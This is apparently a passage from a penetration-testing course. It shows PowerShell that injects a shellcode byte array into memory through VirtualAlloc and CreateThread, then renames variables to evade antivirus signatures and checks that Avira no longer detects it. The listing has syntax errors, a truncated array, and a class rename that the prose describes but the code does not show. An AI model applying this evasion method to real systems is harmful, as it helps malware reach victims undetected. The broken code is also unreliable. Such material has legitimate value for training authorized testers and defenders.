Next we are going to verify the detection rate of our PowerShell script. Our preferred choice would be Antivirus, but it does not support ps1 format, so we have to resort to VirusTotal.

Figure 1: VirusTotal results for in-memory injection in PowerShell

According to the results of VirusTotal, some AV products flagged our script as malicious, including Avira. This is not promising as expected, so we need to circumvent the AV. As mentioned, scripts are just interpreted text. They are not easily fingerprinted like binary files, which have more structured data. In order to catch scripts, AV vendors often rely on static strings related to meaningful code, such as variables or function names. To bypass this detection, let's get the variables from the previous script.

```powershell
$var2 = Add-Type -memberDefinition -Name "Win32" -namespace Win32Functions -passthru;
[byte[]]$var1 =
0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc
0xb8,0x52,0x14,0x88,0x72,0x28
```

```powershell
$size = 0x1000;
if ($var1.Length -gt 0x1000) ($size = $var1.Length);
$x = $var2::VirtualAlloc(0,$size,0x3000,40);
for ($i=0;$i-le $var1.Length-1 {$var2::memset([IntPtr](x.ToInt32()+$i),$var1[$i], 1);}
$var2::CreateThread(0,0,$x,0,0); sleep 60
```

Listing 224 - Renaming variables for Memory Injection

We have updated our script by changing the Win32 hard-coded class name for the Add-Type cmdlet to iWin32. Similarly, we have renamed sc and winFunc to var1 and var2, respectively. Once we run the PowerShell script as bypass.ps1 and transfer it over the target Windows 11 client, we can run a Quick Scan to verify that our attack vector is undetected. To run the scan, we'll click on the Security option on the left menu, select Virus Scans, and then click on Scan under the Quick Scan option.

> To get sense of the detection rate, we could have uploaded the modified bypass to VirusTotal as well. However, as we learned earlier, this could jeopardize our penetration test as our sample could be analyzed and detected by the more powerful cloud-based machine learning engines.

Once Avira has scanned our script on our Windows 11 machine, it indicates our script is not malicious.
